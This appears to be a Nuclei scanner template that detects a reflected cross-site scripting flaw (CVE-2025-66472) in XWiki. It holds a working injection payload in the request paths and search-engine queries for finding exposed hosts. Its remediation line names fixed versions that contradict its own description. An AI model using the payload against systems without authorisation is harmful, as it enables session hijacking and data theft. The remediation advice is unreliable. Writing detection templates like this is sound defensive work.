id: CVE-2025-66472

info:
  name: XWiki DeleteApplication - Cross-Site Scripting
  author: ritikchaddha
  severity: medium
  description: |
    XWiki Platform is a generic wiki platform offering runtime services for applications built on top of it. Versions 6.2-milestone-1 through 16.10.9 and 17.0.0-rc-1 through 17.4.1 of both XWiki Platform Flamingo Skin Resources and XWiki Platform Web Templates are vulnerable to a reflected XSS attack through a deletion confirmation message. The attacker-supplied script is executed when the victim clicks the "No" button. This issue is fixed in versions 16.10.10 and 17.4.2 of both XWiki Platform Flamingo Skin Resources and XWiki Platform Web Templates.
  impact: |
    An attacker can execute arbitrary JavaScript in the victim's browser, leading to potential session hijacking, data theft, or further attacks.
  remediation: |
    Upgrade to XWiki 14.10.14, 15.5.1, 15.8-rc-1 or above. Do not interact with suspiciously crafted links.
  reference:
    - https://github.com/xwiki/xwiki-platform/security/advisories/GHSA-7vpr-jm38-wr7w
    - https://nvd.nist.gov/vuln/detail/CVE-2025-66472
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2025-66472
    epss-score: 0.01481
    epss-percentile: 0.80572
    cwe-id: CWE-80
  metadata:
    verified: true
    max-request: 2
    vendor: xwiki
    product: xwiki
    shodan-query: html:"data-xwiki-reference"
    fofa-query: body="data-xwiki-reference"
  tags: cve,cve2025,xwiki,xss

http:
  - method: GET
    path:
      - "{{BaseURL}}/bin/view/AppWithinMinutes/DeleteApplication?appName=Help.Applications.Contributors&resolve=true&xredirect=%2fbin%2fview%2fHelp%2fApplications%2fContributors%2f'%3balert(document.domain)%2f%2f"
      - "{{BaseURL}}/xwiki/bin/view/AppWithinMinutes/DeleteApplication?appName=Help.Applications.Contributors&resolve=true&xredirect=%2fbin%2fview%2fHelp%2fApplications%2fContributors%2f'%3balert(document.domain)%2f%2f"

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - ';;alert(document.domain)//"><input class="button secondary'
          - 'onclick="location='
        condition: and

      - type: word
        part: content_type
        words:
          - text/html

      - type: status
        status:
          - 200
# digest: 4a0a00473045022100b9c25bd3830bfe947f36a0fd891c221157089bfeebeffe7e66cf31345355b1b30220489575635106e42c2f9eaa0867b4b30452953cc516808affd24fd7fdc542f55a:922c64590222798bb761d5b6d8e72950